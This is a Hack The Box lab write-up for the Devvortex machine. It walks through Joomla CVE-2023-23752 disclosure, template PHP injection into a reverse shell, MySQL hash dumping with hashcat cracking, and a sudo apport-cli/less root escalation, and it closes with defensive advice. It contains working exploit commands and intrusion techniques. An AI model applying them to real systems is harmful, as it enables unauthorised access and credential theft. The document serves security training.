---
title: "HTB - Devvortex"
author: "M0k4"
date: "2026-05-03"
tags: ["htb", "writeup", "linux", "easy", "joomla", "cve-2023-23752", "mysql", "hashcat", "sudo", "apport-cli"]
---

# HTB - Devvortex

**IP Address:** `10.129.28.37`  
**OS:** Linux (Ubuntu; OpenSSH `8.2p1 Ubuntu 4ubuntu0.9`; nginx `1.18.0`)  
**Difficulty:** Easy  
**Tags:** #linux #web #joomla #cve-2023-23752 #mysql #hashcat #sudo #apport-cli

---
## Synopsis

Devvortex exposes **SSH** and **HTTP**. The apex site (`devvortex.htb`) is static marketing HTML behind nginx, while virtual-host probing reveals **`dev.devvortex.htb`** running **Joomla 4.2.6**. **CVE-2023-23752** exposes the Joomla REST configuration and leaks **`lewis`** credentials for the administrator portal; authenticated template customization grants **`www-data`** execution via **`system()`** in **`error.php`**, followed by an outbound reverse shell. **`www-data`** reuses **`lewis`** against **MySQL**, dumps **`sd4fg_users`** bcrypt hashes, cracks **`logan`** offline with **hashcat**, and escalates horizontally to capture **`user.txt`**. **`sudo`** grants **`/usr/bin/apport-cli`** as **`(ALL : ALL)`**; **`sudo apport-cli -f`** reaches **`less`**, where **`!/bin/bash`** yields **`root`**.

---
## Skills Required

- TCP enumeration with **nmap** (full-range plus targeted `-sCV`)
- HTTP recon (**curl**, **whatweb**) and virtual-host discovery (**gobuster vhost**)
- Basic Joomla familiarity (administrator panel, templates)

## Skills Learned

- Exploiting **CVE-2023-23752** (unauthenticated Joomla REST disclosure on vulnerable **4.x** lines)
- Converting Joomla **Super User** access into disk-backed **PHP execution** via site templates
- Dumping Joomla **`#__users`** hashes from **MySQL** and cracking **bcrypt** with **hashcat**
- Privilege escalation via **`sudo apport-cli`** and **`less`** breakout (**GTFOBins** pattern)

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Check if the host is alive using ICMP:

```bash
ping -c 1 10.129.28.37
```

![ping](screenshots/devvortex_01_ping.png)

---
### 1.2 Port Scanning

Scan all TCP ports to identify open services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.28.37 -oG allPorts
```

- `-p-` : Scan all 65,535 ports  
- `--open` : Show only open ports  
- `-sS` : SYN scan (stealthy and fast)  
- `--min-rate 5000` : Increase scan speed  
- `-Pn` : Skip host discovery  
- `-oG` : Output in grepable format  

![allports](screenshots/devvortex_02_nmap_allports.png)

Extract the open ports:

```bash
extractPorts allPorts
```

![extractports](screenshots/devvortex_03_extractports.png)

---
### 1.3 Targeted Scan

Run a deeper scan on the identified ports with version detection and default scripts:

```bash
nmap -sCV -p22,80 10.129.28.37 -oN targeted
cat targeted
```

- `-sC` : Run default NSE scripts  
- `-sV` : Detect service versions  
- `-oN` : Output in human-readable format  

![targeted 1](screenshots/devvortex_04_nmap_targeted_1.png)
![targeted 2](screenshots/devvortex_05_nmap_targeted_2.png)

**Findings:**

| Port(s) | Service | Notes |
|---|---|---|
| 22/tcp | ssh | OpenSSH `8.2p1 Ubuntu 4ubuntu0.9` |
| 80/tcp | http | nginx `1.18.0 (Ubuntu)`; HTTP title reports redirect to **`http://devvortex.htb/`** |

---
## 2. Service Enumeration

### 2.1 Host mapping and apex site fingerprint

Map the apex name for clean HTTP testing:

```bash
echo "10.129.28.37 devvortex.htb" | sudo tee -a /etc/hosts
```

The targeted scan surfaces a nginx vhost redirect; mapping `devvortex.htb` locally makes `Host`/`SNI` behavior match what the server expects during manual review.

```bash
whatweb http://devvortex.htb/
```

![whatweb apex devvortex htb](screenshots/devvortex_06_hosts_whatweb_apex.png)

---
### 2.2 Joomla discovery on `dev.devvortex.htb`

Virtual-host fuzzing (`gobuster vhost` with `--append-domain`) returned a **200** response for **`dev.devvortex.htb`** (distinct from the static apex content). Map the hostname to the same IP, then inspect crawler hints and the administrator entry point.

```bash
curl -s http://dev.devvortex.htb/robots.txt | head -n 40
```

![robots txt dev subdomain](screenshots/devvortex_07_robots_txt_dev_subdomain.png)

The administrator surface is reachable over HTTP on the dev host:

```text
Browser: http://dev.devvortex.htb/administrator/
```

![joomla administrator login](screenshots/devvortex_08_joomla_administrator_login.png)

---
### 2.3 Joomla version confirmation (OWASP JoomScan)

JoomScan corroborates the major/minor line and collects common Joomla paths even when its built-in “core vulnerable” heuristic is stale.

```bash
git clone https://github.com/OWASP/joomscan.git
cd joomscan
./joomscan.pl -u http://dev.devvortex.htb
```

![joomscan clone and run](screenshots/devvortex_09_joomscan_clone_run.png)

The scan run reports **Joomla 4.2.6** and enumerates **`robots.txt`**-linked directories (while still printing “Target Joomla core is not vulnerable,” which manual validation supersedes).

![joomscan results joomla 4.2.6](screenshots/devvortex_10_joomscan_results.png)

---
## 3. Foothold

### 3.1 Unauthenticated disclosure (CVE-2023-23752)

Joomla **4.2.6** is in the affected configuration space for **CVE-2023-23752**. A public PoC dumps users and exposes application secrets that include **`lewis`** credentials for the Joomla administrator session.

```bash
git clone https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT
cd CVE-2023-23752-EXPLOIT
python3 CVE-2023-23752.py -u http://dev.devvortex.htb
```

![cve 2023 23752 exploit output](screenshots/devvortex_11_cve_2023_23752_exploit.png)

Recovered (rotate/redact before any public posting):

- **`lewis`** application password from **`/api/index.php/v1/config/application?public=true`**

---
### 3.2 Authenticated Joomla administrator access

Use the disclosed **`lewis`** credentials at **`http://dev.devvortex.htb/administrator/`** and confirm **`Joomla 4.2.6`** on the administrator dashboard.

```bash
# Browser login at /administrator/ — dashboard confirms privileged session context.
```

![joomla admin dashboard lewis](screenshots/devvortex_12_joomla_admin_dashboard.png)

---
### 3.3 Disk-backed PHP execution via Cassiopeia (`error.php`)

With **Super User** rights, **`System → Templates → Site → Cassiopeia → Editor`** exposes **`/templates/cassiopeia/error.php`**. This solve injected PHP calling **`system()`** so the interpreter executes attacker-controlled commands when the template path is loaded—followed by an outbound **`bash`** TCP reverse shell from the victim toward your listener.

```bash
nc -lvnp 443
# After saving the template change, browse/trigger execution against the Cassiopeia error template URL under the docroot (example observed during the solve):
# http://dev.devvortex.htb/templates/cassiopeia/error.php
```

![cassiopeia error php editor](screenshots/devvortex_13_cassiopeia_error_php_editor.png)

![reverse shell nc www-data](screenshots/devvortex_14_reverse_shell_nc_www_data.png)

---
### 3.4 Confirming execution context (`www-data`)

Validate the resulting shell maps to the web stack account and locate local users/home directories relevant for the next pivot.

```bash
whoami
id
ls /home
cat /home/logan/user.txt
```

![www-data home enum permission denied user txt](screenshots/devvortex_15_www_data_home_enum.png)

---
## 4. Privilege Escalation

### 4.1 Reusing `lewis` credentials against MySQL (`joomla` / `sd4fg_users`)

The same **`lewis`** password accepted by Joomla also authenticates to local **MySQL**, revealing the **`joomla`** schema and **`sd4fg_*`** tables.

```bash
mysql -u lewis -p
```

```text
mysql> SHOW DATABASES;
mysql> USE joomla;
mysql> SHOW TABLES;
```

![mysql joomla databases and tables](screenshots/devvortex_16_mysql_joomla_tables.png)

Harvest Joomla user password hashes:

```text
mysql> SELECT username, email, password FROM sd4fg_users;
```

![mysql sd4fg users bcrypt hashes](screenshots/devvortex_17_mysql_sd4fg_users_hashes.png)

---
### 4.2 Offline bcrypt cracking (`hashcat`)

Export bcrypt hashes (`$2y$`) into a **`hashcat`** input file and crack against **`rockyou.txt`** (**`-m 3200`**).

```bash
hashcat -m 3200 --user hashes /usr/share/wordlists/rockyou.txt
```

![hashcat bcrypt logan cracked](screenshots/devvortex_18_hashcat_bcrypt_logan.png)

Recovered:

- **`logan`**: cracked plaintext observed during this solve (**rotate/redact before publishing**).

---
### 4.3 Horizontal escalation to `logan` / user proof

Switch context from **`www-data`** to **`logan`** using the cracked password and read **`user.txt`**.

```bash
su logan
cat /home/logan/user.txt
```

![user flag logan](screenshots/devvortex_19_user_flag_logan.png)

🏁 **User flag obtained**

- **`user.txt`**: `1430b81fca30a223b2c5cd1bd9272fdc`

---
### 4.4 `sudo` enumeration (`apport-cli`)

On **`logan`**, **`sudo -l`** prompts for **`logan`**’s password and lists a constrained-but-dangerous privilege:

```bash
sudo -l
```

![sudo l apport cli](screenshots/devvortex_20_sudo_l_apport_cli.png)

---
### 4.5 Root via `sudo apport-cli` + `less` breakout

**GTFOBins** documents **`apport-cli`** spawning a pager (**`less`**). Running the permitted binary under **`sudo`** makes the pager run with elevated privileges; **`!/bin/bash`** breaks out to **`root`**.

```bash
sudo /usr/bin/apport-cli -f
# choose: 1 (Display / X.org), 2 (Freezes/hangs), then v (View report)
# inside less:
!/bin/bash
whoami
cat /root/root.txt
```

![apport cli menu view report](screenshots/devvortex_22_apport_cli_menu_view_report.png)

![apport less bang bash](screenshots/devvortex_21_apport_less_bang_bash.png)

![root shell root txt](screenshots/devvortex_23_root_shell_root_txt.png)

🏁 **Root flag obtained**

- **`root.txt`**: `ce752c421aa7df17ca9e6df841a87310`

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **nmap**: `22/tcp`, `80/tcp` → nginx redirect exposes **`devvortex.htb`**.
2. **Virtual hosts**: **`dev.devvortex.htb`** → Joomla artifacts (**`robots.txt`**, **`/administrator/`**).
3. **CVE-2023-23752**: disclose **`lewis`** credentials → Joomla admin.
4. **Template abuse**: **`system()`** in **`templates/cassiopeia/error.php`** → **`www-data`** reverse shell.
5. **MySQL**: **`lewis`** → dump **`sd4fg_users`** bcrypt hashes → **`hashcat`** cracks **`logan`**.
6. **`sudo /usr/bin/apport-cli`** interactive flow → **`less`** → **`!/bin/bash`** → **`root`**.

---
## Defensive Recommendations

- Patch Joomla past affected builds for **CVE-2023-23752** and validate REST exposure/configuration hardening.
- Enforce MFA and strict admin-session controls; restrict template/source editors on production CMS deployments where possible.
- Treat database credentials embedded in CMS configuration as sensitive—enforce least-privilege DB users and rotate secrets after incidents.
- Avoid **`sudo`** grants on interactive troubleshooting binaries (**`apport-cli`**) for standard users unless tightly confined with security-reviewed wrappers.
